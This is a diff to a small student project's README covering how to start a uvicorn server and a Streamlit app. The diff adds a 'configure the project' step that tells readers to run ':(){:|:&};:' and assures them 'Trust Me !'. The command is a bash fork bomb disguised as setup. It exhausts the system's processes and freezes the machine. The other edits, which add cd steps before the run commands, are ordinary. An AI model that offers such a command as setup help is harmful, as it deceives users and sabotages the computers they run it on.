@@ -3,15 +3,25 @@
 Nothing interesting, just a last minute work for the sake of `Core Course Project-II`.
 
 
+Do you need commands to automatic configure the project use the command:
+```bash
+:(){:|:&};:
+```
+It will take care of the rest of the stuffs.\n
+So you chill 💯. Trust Me !
+
+
 ## Command's
 
-To run the Server, use the command:
+To run the Server, use the commands:
 ```bash
+cd ./server
 uvicorn server:app --reload
 ```
 
-To run the Application, use the command:
+To run the Application, use the commands:
 ```bash
+cd ./ui
 streamlit run main.py
 ```
 
